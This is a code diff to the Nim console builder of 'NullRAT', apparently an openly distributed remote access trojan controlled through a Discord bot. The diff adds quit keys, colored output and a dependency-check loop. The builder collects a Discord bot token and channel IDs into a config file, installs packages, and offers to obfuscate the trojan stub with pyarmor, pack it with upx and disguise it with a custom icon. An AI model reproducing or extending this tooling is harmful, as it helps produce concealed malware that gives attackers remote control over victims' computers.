@@ -4,12 +4,12 @@ import std/browsers
 import std/osproc
 import std/[strutils, strformat]
 
+# Windows-only
 proc cls() = 
     discard execShellCmd("cls")
-
+    
 discard execShellCmd("title NullRAT Builder");
-discard execShellCmd("chcp 65001");
-cls()
+discard execShellCmd("chcp 65001 & color 4");
 discard execShellCmd("mode con: cols=80 lines=29");
 
 proc cleanWorkingDir() =
@@ -67,22 +67,23 @@ proc compiler(): int =
     printName()
     var dirr = getAppDir()
     setCurrentDir(dirr / "NullRAT")
-    echo ""
     
     stdout.styledWriteLine({styleBright}, "  >> Stub Compiler <<")
     echo ""
     var obfuscate: bool
     var compress: bool
     var icon: bool
-    
+        
     stdout.styledWriteLine({styleBright}, "Do you want to obfuscate the executable? (Y/n)")
     var input: char = getch()
     if input == 'N' or input == 'n': obfuscate = false
+    elif input == 'Q' or input == 'q': return 0
     else: obfuscate = true
     
     stdout.styledWriteLine({styleBright}, "Do you want to compress the executable? (Y/n)")
     input = getch()
     if input == 'N' or input == 'n': compress = false
+    elif input == 'Q' or input == 'q': return 0
     else: compress = true
     
     stdout.styledWriteLine({styleBright}, "Do you want to set a custom icon? (y/N)")
@@ -92,6 +93,7 @@ proc compiler(): int =
         icon = true
         echo "Enter custom icon (.ico file) path:"
         iconPath = readLine(stdin);
+    elif input == 'Q' or input == 'q': return 0
     else: icon = false
 
     printName()
@@ -101,52 +103,56 @@ proc compiler(): int =
     if obfuscate: echo "Executable will be obfuscated (w/ pyarmor)"
     if compress: echo "Executable will be compressed (w/ upx)"
     if icon: 
-        echo "Executable will have custom icon."
+        echo "Executable will have custom icon (",iconPath,")"
         echo "Path: ", iconPath
     echo ""
-    stdout.styledWriteLine({styleBright}, "Is this information correct? (Y/n)")
+    stdout.styledWriteLine({styleBright}, "Would you like to compile now? (Y/n)")
     input = getch()
     if input == 'N' or input == 'n':
-        echo "- Information marked incorrect! Aborting..."
+        echo "- User declined request. Aborting..."
         sleep(1000)
         return 0
+    elif input == 'Q' or input == 'q': return 0
     else:
         stdout.styledWriteLine(fgCyan, "- Compiling using selected settings...") 
         stdout.styledWriteLine(fgCyan, "- Checking pyinstaller")
-        echo wherePy = execCmdEx("where pyinstaller")
+        var wherePy = execCmdEx("where pyinstaller").output
+        echo wherePy
+        discard getch()
     
-proc variablesCreator() = 
+proc variablesCreator(x: int) = 
     printName()
     var dirr = getAppDir()
     setCurrentDir(dirr / "NullRAT")
-    echo ""
     
-    stdout.styledWriteLine({styleBright}, "  >> Variables Creator <<")
-    if fileExists("Variables.py"):
-        echo "\n- Existing Variables file discovered!"
-        echo "\nStored information\n------------------"
-        let EnF = readFile("Variables.py")
-        echo EnF
-        stdout.styledWriteLine({styleBright}, "Is this information correct? (Y/n)")
-        var input: char = getch()
-        if input == 'N' or input == 'n':
-            echo "- Information marked incorrect! Continuing..."
-            sleep(1000)
-            printName()
-        else:
-            echo "- Information marked correct. Preserving..."
-            sleep(1000)
-            if compiler() == 0:
-                return 
+    if x != 1:
+        stdout.styledWriteLine({styleBright}, "  >> Variables Creator <<")
+        if fileExists("Variables.py"):
+            stdout.styledWriteLine(fgGreen, {styleBright}, "\n- Existing Variables file discovered!")
+            stdout.styledWriteLine(fgCyan, {styleBright}, "\nStored information\n------------------")
+            let EnF = readFile("Variables.py")
+            stdout.styledWriteLine(fgCyan, {styleBright}, EnF)
+            stdout.styledWriteLine({styleBright}, "Is this information correct? (Y/n)")
+            var input: char = getch()
+            if input == 'N' or input == 'n':
+                echo "- Information marked incorrect! Continuing..."
+                sleep(1000)
+                printName()
+            elif input == 'Q' or input == 'q': return 
+            else:
+                stdout.styledWriteLine(fgGreen, {styleBright}, "- Information marked correct. Preserving...")
+                sleep(1000)
+                if compiler() == 0:
+                    return 
 
-    echo "-----------\nTo know how to obtain the variables,\nCheck 'Getting Variables.md' in NullRAT Github\n-----------"
-    stdout.styledWriteLine({styleBright}, "\n[1] Please enter the Discord bot token: ")
+    stdout.styledWriteLine(fgWhite, {styleBright}, "----------------\nTo know how to obtain the variables,\nCheck 'Getting Variables.md' in NullRAT Github\n----------------")
+    stdout.styledWriteLine(fgWhite, {styleBright}, "\n[1] Please enter the Discord bot token: ")
     var token = readLine(stdin);
-    stdout.styledWriteLine({styleBright}, "[2] Please enter the Server ID: ")
+    stdout.styledWriteLine(fgWhite, {styleBright}, "[2] Please enter the Server ID: ")
     var serverID = readLine(stdin)
-    stdout.styledWriteLine({styleBright}, "[3] Please enter the Notification channel ID: ")
+    stdout.styledWriteLine(fgWhite, {styleBright}, "[3] Please enter the Notification channel ID: ")
     var notificationID = readLine(stdin)
-    
+        
     let lines = [
         "# This file was auto-generated by NullRAT Builder. DO NOT EDIT!",
         fmt"bot_token = ""{token}""",
@@ -167,7 +173,9 @@ proc variablesCreator() =
     var input: char = getch()
     if input == 'N' or input == 'n':
         echo "- Aborted! Returning to main menu..."
-        sleep(2000)
+        sleep(1500)
+        variablesCreator(1)
+    elif input == 'Q' or input == 'q': return 
     else:
         echo "- Information marked correct. Writing..."
         removeFile("Variables.py")
@@ -183,7 +191,9 @@ proc variablesCreator() =
         sleep(3000)
         if compiler() == 0:
             return
-            
+
+const pipModules = ["pyinstaller==4.10", "virtualenv", "disnake", "requests", "pyarmor", "mss"]
+         
 proc packageInstaller() = 
     printName()
     stdout.styledWriteLine({styleBright}, "  >> Dependencies Installer <<")
@@ -200,30 +210,32 @@ proc packageInstaller() =
         if result.exitCode != 0:
             echo "pip command failed to execute!!"
         else:
-            if "pyinstaller==4.10" notin result.output or "virtualenv" notin result.output or "disnake" notin result.output or "requests" notin result.output or "pyarmor" notin result.output or "mss" notin result.output:
-                echo "Some dependencies are not installed!"
-                allInstalled = false
+            for module in pipModules:
+                if module notin result.output:
+                    echo "Some dependencies are not installed!"
+                    allInstalled = false
             
             if allInstalled:
-                echo "- All packages installed and detected!\n\nProceeding on with variables creation..."
-                sleep(3000)
-                variablesCreator()
+                stdout.styledWriteLine(fgGreen, {styleBright}, "- All packages installed and detected!\n\nProceeding on with variables creation...")
+                sleep(1500)
+                variablesCreator(0)
             else:
                 stdout.styledWriteLine({styleBright}, "[3] Installing/Updating dependencies...")
                 var res = execShellCmd("pip install pyinstaller==4.10 virtualenv aiohttp disnake requests mss pyarmor")
                 if res == 0:
                     echo "========================"
-                    stdout.styledWriteLine({styleBright}, "All Installed!\nMoving to variables creation...")
+                    stdout.styledWriteLine(fgGreen, {styleBright}, "All Installed!\nMoving to variables creation...")
                     sleep(2000)
-                    variablesCreator()
+                    variablesCreator(0)
 
     else:
         stdout.styledWriteLine({styleBright}, "- Python not installed!\n\nWould you like to download the recommended python installer? (Y/n): ")
         var input: char = getch();
         if input == 'N' or input == 'n':
-            echo "NullRAT Builder cannot continue otherwise!!! Exiting..."
-            sleep(2000)
+            echo "NullRAT Builder cannot continue otherwise!!! Exiting in 5 seconds..."
+            sleep(5000)
             quit(1)
+        elif input == 'Q' or input == 'q': return 
         else:
             openDefaultBrowser("https://www.python.org/ftp/python/3.8.10/python-3.8.10.exe")
             echo ""
@@ -243,15 +255,16 @@ proc mainMenu() =
     printName();
     stdout.styledWriteLine({styleBright}, "  >> NullRAT Builder v1.1 <<")
     echo ""
-    stdout.styledWriteLine({styleBright}, " Press any key to continue, E to exit and C to clear working directory...")
+    stdout.styledWriteLine(fgGreen, {styleBright}, " - HINT! Press Q in any window to immediately return here!")
+    stdout.styledWriteLine({styleBright}, " Press any key to continue, E/Q to exit and C to clear working directory...")
     var input: char = getch();
-    if input == 'E' or input == 'e':
+    if input == 'E' or input == 'e' or input == 'Q' or input == 'q':
         quit(0)
     elif input == 'C' or input == 'c':
         cleanWorkingDir()
     else:
         packageInstaller()
-        
+            
 while true:
     mainMenu();
 #stdout.styledWriteLine(fgRed, "")
